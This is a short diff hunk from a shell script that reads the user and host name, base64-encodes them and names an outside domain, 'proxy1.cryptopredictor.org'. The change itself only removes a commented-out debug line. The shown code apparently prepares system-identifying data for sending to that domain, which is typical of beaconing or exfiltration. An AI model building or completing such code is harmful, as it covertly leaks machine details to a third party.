@@ -19,7 +19,6 @@ username=$(whoami)
 hostname=$(hostname)
 
 data=$(echo -n "$user:$username:$hostname" | base64)
-#echo -e "Data:\t$data"
 
 domain_name="proxy1.cryptopredictor.org"
 
